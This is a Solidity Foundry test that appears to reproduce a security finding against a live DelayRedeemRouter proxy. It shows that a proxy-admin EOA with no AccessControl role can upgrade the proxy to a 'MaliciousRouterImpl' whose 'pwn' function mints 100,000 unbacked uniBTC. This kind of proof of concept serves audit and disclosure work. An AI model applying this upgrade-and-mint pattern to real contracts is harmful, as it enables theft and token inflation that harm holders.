// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/MaliciousRouterImpl.sol";

interface IProxyAdminSlot { function upgradeTo(address) external; }
interface IAccessControl { function hasRole(bytes32, address) external view returns (bool); }
interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address) external view returns (uint256); }

contract LegacyRouterUpgradeTest is Test {
    address constant ROUTER = 0xBB45B3a09BFfC15747D1a331775Fa408e587f38d; // legacy DelayRedeemRouter proxy
    address constant PROXY_ADMIN_EOA = 0x3eea50ba10952E5e0dFAa50EcFCc5AB19aD591Ef; // EIP-1967 admin slot value
    address constant ROLE_HOLDER = 0x1fc76b7C6F092e0566Ce9Bbb9c6803Ba5e45Ba32; // DEFAULT_ADMIN_ROLE on the impl
    address constant VAULT = 0x047D41F2544B7F63A8e991aF2068a363d210d6Da;
    address constant UNIBTC = 0x004E9C3EF86bc1ca1f0bB5C7662861Ee93350568;
    address constant SINK = 0x000000000000000000000000000000000000dEaD;
    bytes32 constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 constant ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
    bytes32 constant DEFAULT_ADMIN_ROLE = 0x00;

    function _impl() internal view returns (address) {
        return address(uint160(uint256(vm.load(ROUTER, IMPL_SLOT))));
    }

    function testProxyAdminIsEoaNotRoleHolder() public view {
        address admin = address(uint160(uint256(vm.load(ROUTER, ADMIN_SLOT))));
        assertEq(admin, PROXY_ADMIN_EOA, "EIP-1967 admin slot should be the EOA");
        assertEq(PROXY_ADMIN_EOA.code.length, 0, "proxy admin is an EOA (no code)");
        // The confusing part: the EOA does NOT hold DEFAULT_ADMIN_ROLE, yet still controls upgrades.
        assertFalse(IAccessControl(ROUTER).hasRole(DEFAULT_ADMIN_ROLE, PROXY_ADMIN_EOA), "EOA has no AccessControl role");
        assertTrue(IAccessControl(ROUTER).hasRole(DEFAULT_ADMIN_ROLE, ROLE_HOLDER), "role holder is a different address");
    }

    function testRoleHolderCannotUpgrade() public {
        MaliciousRouterImpl newImpl = new MaliciousRouterImpl();
        vm.prank(ROLE_HOLDER);
        vm.expectRevert(); // transparent proxy: non-admin calldata falls through to impl, which has no upgradeTo
        IProxyAdminSlot(ROUTER).upgradeTo(address(newImpl));
    }

    function testEoaUpgradesAndMintsUnbacked() public {
        uint256 supplyBefore = IERC20(UNIBTC).totalSupply();
        uint256 sinkBefore = IERC20(UNIBTC).balanceOf(SINK);
        address implBefore = _impl();

        MaliciousRouterImpl newImpl = new MaliciousRouterImpl();

        // 1. Only the EIP-1967 proxy admin EOA can upgrade.
        vm.prank(PROXY_ADMIN_EOA);
        IProxyAdminSlot(ROUTER).upgradeTo(address(newImpl));
        assertEq(_impl(), address(newImpl), "implementation replaced by EOA");
        assertTrue(_impl() != implBefore, "implementation actually changed");

        // 2. Anyone can now call the malicious function; the router (Vault OPERATOR) mints.
        uint256 amount = 100_000e8; // 100,000 uniBTC, ~21x Chainlink reserves
        MaliciousRouterImpl(ROUTER).pwn(VAULT, UNIBTC, SINK, amount);

        assertEq(IERC20(UNIBTC).totalSupply(), supplyBefore + amount, "total supply inflated");
        assertEq(IERC20(UNIBTC).balanceOf(SINK), sinkBefore + amount, "unbacked uniBTC minted to attacker");
    }
}
